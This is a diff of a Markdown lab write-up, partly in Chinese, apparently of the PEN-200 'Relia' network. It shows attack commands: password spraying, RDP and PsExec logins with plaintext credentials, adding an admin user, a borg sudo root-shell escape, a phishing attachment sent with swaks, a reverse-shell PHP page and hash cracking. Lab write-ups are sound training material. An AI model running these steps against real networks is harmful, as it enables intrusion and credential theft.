@@ -1,4 +1,5 @@
 ## Overview
+
 ![image](_assets/Hy5_xnul-g.png)
 
 ## Nmap(外網)
@@ -56,6 +57,7 @@
 
 ## SMB匿名登入
 `while IFS= read -r host; do echo $host;smbclient -N -L //$host/;echo "\n" ;done < outerHosts.txt`
+
 ![image](_assets/BJZQ2JMb-e.png)
 
 ## 192.168.x.189
@@ -85,13 +87,17 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 
 ## 192.168.x.245
 之前看過這類型的漏洞，確認245的Apache版本確實是有漏洞的
+
 ![image](_assets/HyGaT3dlZe.png)
+
 ![image](_assets/Sygr02ue-g.png)
 
 * `Path Traversal`
 沒找到id_rsa檔案，但嘗試其他加密種類確實有找到私鑰
-![image](_assets/rJEaTod--g.png)
-![image](_assets/BJNvRjuWZg.png)
+
+  ![image](_assets/rJEaTod--g.png)
+
+  ![image](_assets/BJNvRjuWZg.png)
 
 * `ssh login`
 
@@ -108,7 +114,9 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
   ![image](_assets/BJLfomjZbg.png)
 
 ## 192.168.x.246
+
 ![image](_assets/BJLBOabzZl.png)
+
 ![image](_assets/B1Ye9p-zbl.png)
 
 * `ssh`
@@ -117,20 +125,30 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 
 * `Privilege escalation`
     1. `sudo version`
-    ![image](_assets/BJT73AZzWl.png)
-    ![image](_assets/SyGPh0WGZx.png)
-    ![image](_assets/rk2e6RZGbe.png)
+
+       ![image](_assets/BJT73AZzWl.png)
+
+       ![image](_assets/SyGPh0WGZx.png)
+
+       ![image](_assets/rk2e6RZGbe.png)
 
     2. `System config`
-    ![image](_assets/r17zMv4zWg.png)
-    ![image](_assets/r1mHfPNzWe.png)
-    ![image](_assets/ry6a6vNGZx.png)
+
+       ![image](_assets/r17zMv4zWg.png)
+
+       ![image](_assets/r1mHfPNzWe.png)
+
+       ![image](_assets/ry6a6vNGZx.png)
 
     3. `sus port`
-    ![image](_assets/Hygon8ONM-x.png)
-    ![image](_assets/SJyUBOEfWg.png)
-    ![image](_assets/Hkz1ROVfbg.png)
-    ![image](_assets/rJIfAuVM-x.png)
+
+       ![image](_assets/Hygon8ONM-x.png)
+
+       ![image](_assets/SJyUBOEfWg.png)
+
+       ![image](_assets/Hkz1ROVfbg.png)
+
+       ![image](_assets/rJIfAuVM-x.png)
 
 * `8000 port`
 
@@ -143,9 +161,12 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
   ![image](_assets/BJqlEt4zWe.png)
 
     1. `Writable Directory for Anita`
-    ![image](_assets/Ske58nBGZx.png)
-    ![image](_assets/S10oLhSGbl.png)
-    ![image](_assets/HkrlunBM-e.png)
+
+       ![image](_assets/Ske58nBGZx.png)
+
+       ![image](_assets/S10oLhSGbl.png)
+
+       ![image](_assets/HkrlunBM-e.png)
 
 * `Privilege escalation(Again)`
 
@@ -242,14 +263,20 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
     welcome1
     ```
 
-    ![image](_assets/HJcWElGW-x.png)
-    ![image](_assets/B15oUlfWZe.png)
-    ![image](_assets/Sy2Rtefbbl.png)
-    ![image](_assets/H1N93xMWWe.png)
+   ![image](_assets/HJcWElGW-x.png)
+
+   ![image](_assets/B15oUlfWZe.png)
+
+   ![image](_assets/Sy2Rtefbbl.png)
+
+   ![image](_assets/H1N93xMWWe.png)
+
     2. wwwroot
     `dnnuser`&`DotNetNukeDatabasePassword!`
-    ![image](_assets/r1eqK-GZbg.png)
-    ![image](_assets/HkPnYWzbWx.png)
+
+       ![image](_assets/r1eqK-GZbg.png)
+
+       ![image](_assets/HkPnYWzbWx.png)
 
 2. 灑密碼
     * `smb`
@@ -275,25 +302,37 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 3. rdp
 `xfreerdp3 /u:emma /p:SomersetVinyl1! /v:192.168.220.248 /dynamic-resolution`
 系統內的C槽有一個不尋常的資料夾，打開裡面的內容發現有一個log檔，裡面的內容顯示缺少`BetaLibrary.Dll`且看起來是每一分鐘定期執行，直接執行後可以得知程式的執行者是`mark`
-![image](_assets/rkxJVSo-bl.png)
-![image](_assets/Skz07SobWg.png)
-![image](_assets/By3x4Hibbl.png)
-![image](_assets/B11mESiZbg.png)
-![image](_assets/rJASM_h-Wx.png)
-![image](_assets/Hk-Pz_hWWg.png)
+
+   ![image](_assets/rkxJVSo-bl.png)
+
+   ![image](_assets/Skz07SobWg.png)
+
+   ![image](_assets/By3x4Hibbl.png)
+
+   ![image](_assets/B11mESiZbg.png)
+
+   ![image](_assets/rJASM_h-Wx.png)
+
+   ![image](_assets/Hk-Pz_hWWg.png)
 
 4. Privilege escalation
 `xfreerdp3 /u:mark /p:"\!8@aBRBYdb3\!" /v:192.168.185.248 /dynamic-resolution`
 用Powerup找到能夠寫入的環境變數的路徑，但log顯示還是無法找到dll，嘗試直接呼叫dll的名字能夠正常被找到，推測是只能放在跟程式相同的資料夾
 而在環境變數裡還能找到一個`Appkey`，用這組密碼跟電腦內的其他使用者組合成功確認為mark的密碼
-![image](_assets/rJa7xLiZWx.png)
-![image](_assets/SkWlZt3Wbx.png)
-![image](_assets/S1Guet3Zbe.png)
+
+   ![image](_assets/rJa7xLiZWx.png)
+
+   ![image](_assets/SkWlZt3Wbx.png)
+
+   ![image](_assets/S1Guet3Zbe.png)
 
 5. Password spray
-![image](_assets/Hy8krKnb-g.png)
-![image](_assets/SJL8rFhWZl.png)
-![image](_assets/HJWdrK3-be.png)
+
+   ![image](_assets/Hy8krKnb-g.png)
+
+   ![image](_assets/SJL8rFhWZl.png)
+
+   ![image](_assets/HJWdrK3-be.png)
 
 ## 192.168.x.249
 * `8000 port`
@@ -303,20 +342,29 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
   ![image](_assets/HkeLC-OmZg.png)
 
   ![image](_assets/SyTeXarfZx.png)
+
     1. `Default Password`
     `admin` & `admin`
-    ![image](_assets/S1EgaTHGZx.png)
+
+       ![image](_assets/S1EgaTHGZx.png)
     
     2. `Exploit`
-    ![image](_assets/HJvQyASzZx.png)
-    ![image](_assets/SJmZJ0Hzbl.png)
-    ![image](_assets/HJXbZASMbe.png)
-    ![image](_assets/rks6xRBMbl.png)
-    ![image](_assets/BkTAxRSfWe.png)
+
+       ![image](_assets/HJvQyASzZx.png)
+
+       ![image](_assets/SJmZJ0Hzbl.png)
+
+       ![image](_assets/HJXbZASMbe.png)
+
+       ![image](_assets/rks6xRBMbl.png)
+
+       ![image](_assets/BkTAxRSfWe.png)
     
     3. `RCE`
-    ![image](_assets/H1VNVASMZe.png)
-    ![image](_assets/HkhBN0SzWg.png)
+
+       ![image](_assets/H1VNVASMZe.png)
+
+       ![image](_assets/HkhBN0SzWg.png)
 
 * `Privilege Escalation`
 
@@ -330,7 +378,8 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 
 * `credentials dumps`
 `maildmz@relia.com:DPuBT9tGCBrTbR`&`jim@relia.com`
-![image](_assets/HJ5iI4_7Wl.png)
+
+  ![image](_assets/HJ5iI4_7Wl.png)
 
 ## Nmap(內網)
 * 172.16.x.7
@@ -581,6 +630,7 @@ Nmap done: 7 IP addresses (7 hosts up) scanned in 202.71 seconds
   ![image](_assets/rJGbxO8SZl.png)
 
   ![image](_assets/rk_ExOUH-l.png)
+
     * wpscan
     ```
     [+] WordPress version 6.0.3 identified (Insecure, released on 2022-10-17).
@@ -620,11 +670,13 @@ Nmap done: 7 IP addresses (7 hosts up) scanned in 202.71 seconds
      |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
      |  Login Error Messages (Aggressive Detection)
     ```
-    ![image](_assets/ryoxnMFHbl.png)
+
+      ![image](_assets/ryoxnMFHbl.png)
 
     * wplogin
     `http://intranet.relia.com/wordpress/wp-login.php`
-    ![image](_assets/r12ISdLrZx.png)
+
+      ![image](_assets/r12ISdLrZx.png)
     
 * AS-REP
 `xfreerdp3 /u:michelle /p:NotMyPassword0k\? /v:172.16.x.7 /d:relia.com /dynamic-resolution`
@@ -647,16 +699,23 @@ The command completed successfully.
 * Privilege escalation
 `net user dave2 password123$ /add`
 `net localgroup administrators dave2 /add`
-![image](_assets/BkweQHKSWe.png)
-![image](_assets/B19nmSYrWx.png)
-![image](_assets/r1-1EHKHbe.png)
-![image](_assets/rJwx4SYBWx.png)
-![image](_assets/r14MEHFBbl.png)
-![image](_assets/S1Q1SHYr-x.png)
+
+  ![image](_assets/BkweQHKSWe.png)
+
+  ![image](_assets/B19nmSYrWx.png)
+
+  ![image](_assets/r1-1EHKHbe.png)
+
+  ![image](_assets/rJwx4SYBWx.png)
+
+  ![image](_assets/r14MEHFBbl.png)
+
+  ![image](_assets/S1Q1SHYr-x.png)
 
 * Cred search
 
   ![image](_assets/ByscLHKSbe.png)
+
 ```
 ┌──(kali㉿kali)-[~/Desktop/Pen200/Relia]
 └─$ nxc rdp 172.16.158.0/24 -u andrea -p PasswordPassword_6 
@@ -680,8 +739,11 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 * mail
 `swaks --from maildmz@relia.com --to jim@relia.com --server 192.168.111.189 --auth LOGIN --auth-user maildmz@relia.com --header "88" --body "hello" --attach @config.Library-ms`
 `DPuBT9tGCBrTbR`
-![image](_assets/HyJnl3cEZg.png)
-![image](_assets/B1Xgbn5Vbe.png)
+
+  ![image](_assets/HyJnl3cEZg.png)
+
+  ![image](_assets/B1Xgbn5Vbe.png)
+
 ```powershell
 PS C:\Users\jim\Documents> ipconfig /all
 ipconfig /all
@@ -715,7 +777,8 @@ using password found 172.16.x.21 smb share
 
 * Cred search
     1. `Castello1!`
-    ![image](_assets/B17pX4TVZx.png)
+
+       ![image](_assets/B17pX4TVZx.png)
     
     2. `kdbx`
     ```
@@ -767,7 +830,8 @@ using password found 172.16.x.21 smb share
     Use the "--show" option to display all of the cracked passwords reliably
     Session completed. 
     ```
-    ![image](_assets/By4MoHaVbx.png)
+
+       ![image](_assets/By4MoHaVbx.png)
 
     * AS-REP Roasting
     ```
@@ -859,17 +923,23 @@ using password found 172.16.x.21 smb share
 
 * cred search
     1. hash
-    ![image](_assets/Hk8rQIKBWl.png)
-    ![image](_assets/BJmUP89SZx.png)
+
+       ![image](_assets/Hk8rQIKBWl.png)
+
+       ![image](_assets/BJmUP89SZx.png)
 
     2. kbdx
     ```
     sarah    placeholder
     ```
-    ![image](_assets/SyBbHLKH-e.png)
-    ![image](_assets/SJtzB8YHWx.png)
-    ![image](_assets/B1pnH8trbe.png)
-    ![image](_assets/ry6MDUtHZe.png)
+
+       ![image](_assets/SyBbHLKH-e.png)
+
+       ![image](_assets/SJtzB8YHWx.png)
+
+       ![image](_assets/B1pnH8trbe.png)
+
+       ![image](_assets/ry6MDUtHZe.png)
 
 ## 172.16.x.19
 `ssh sarah@172.16.x.19 -i innerSSH.PRIV`
@@ -908,7 +978,9 @@ using password found 172.16.x.21 smb share
 	sarah ALL=(ALL) NOPASSWD:/usr/bin/borg extract *
 	sarah ALL=(ALL) NOPASSWD:/usr/bin/borg mount *
     ```
-    ![image](_assets/ry0SdvAHWe.png)
+
+       ![image](_assets/ry0SdvAHWe.png)
+
     ```bash
     sarah@backup:~$ sudo borg extract @:/::: --rsh "/bin/bash -c '/bin/bash </dev/tty >/dev/tty 2>/dev/tty'"
     root@backup:/home/sarah# 
@@ -1006,7 +1078,9 @@ using password found 172.16.x.21 smb share
 
 * Privilege escalation
     1. Doas
-	![image](_assets/rySzBR4Lbe.png)
+
+       ![image](_assets/rySzBR4Lbe.png)
+
 	```
 	╔══════════╣ Doas Configuration
 	╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#doas                                                                                            
@@ -1071,7 +1145,8 @@ using password found 172.16.x.21 smb share
 	/var/tmp/vi.recover
     ```
     `http://172.16.142.20/phpMyAdmin/tmp/rev.php`
-    ![image](_assets/rkVx0xSUbx.png)
+
+       ![image](_assets/rkVx0xSUbx.png)
 
 * cred search
 ```
@@ -1310,7 +1385,8 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 
 * 172.16.x.21
 `.\PsExec64.exe -i \\FILES -u relia\Administrator -p vau!XCKjNQBv2$ cmd`
-![image](_assets/B1ZSWsPIZe.png)
+
+  ![image](_assets/B1ZSWsPIZe.png)
 
 * 172.16.x.30
 `.\PsExec64.exe -i \\WEBBY -u relia\Administrator -p vau!XCKjNQBv2$ powershell`
